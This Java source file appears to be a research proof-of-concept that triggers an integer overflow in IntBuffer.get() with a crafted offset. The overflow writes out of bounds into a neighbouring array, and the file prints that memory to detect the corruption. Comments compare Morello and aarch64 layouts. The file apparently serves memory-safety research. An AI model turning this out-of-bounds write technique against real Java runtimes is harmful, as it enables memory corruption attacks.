package src.main.java.TypeConfusionDemo;
import java.nio.ByteBuffer;
import java.nio.IntBuffer;

import TypeConfusionDemo.DemoHelper;
import sun.misc.Unsafe;
import java.lang.reflect.Field;

public class OverflowDemo {
  private static Unsafe unsafe;
  private int[] emptySpace;
  private int[] dst;
  private IntBuffer ib;
  private final int dstOffset = 1073741764; // overflow -240 from 1073741764 << 2
  private final int length = 2;
  
  public OverflowDemo() throws java.lang.NoSuchFieldException, IllegalAccessException {
    unsafe = DemoHelper.getUnsafe();
    emptySpace = DemoHelper.init_array(120000000, 0xBABABABA);
    dst = DemoHelper.init_array(1209098507, 0xAAAAAAAA);
    ib = DemoHelper.init_int_buffer(400, 0xBBBBBBBB);
  }

  public void testOverflow() {
    // These arrays should end up next to each other in memory
    // Vulnerability is in the Buffer code, but the overflow occurs on the dst array.
    ib.get(dst, dstOffset, length); 
    checkOverflow(emptySpace);
  }

  public void checkOverflow(int[] emptySpace) {
    // morello = -192 (192/4 = 48), aarch64 -219 (218/4 = 54)
    int overflowDst = unsafe.addressSize() == 16 ? -48 : -54;
    for (int i = (overflowDst - 5); i < (overflowDst + 5); i++) {
      String hex = DemoHelper.format_hex(emptySpace[emptySpace.length + i]);
      String add_string = hex.compareTo(DemoHelper.format_hex(0xBBBBBBBB)) == 0 ? " OVERFLOW !!!!" : "";
      System.out.println("Pos: " + i + " and value: " + hex + add_string);
    } 
  }


}
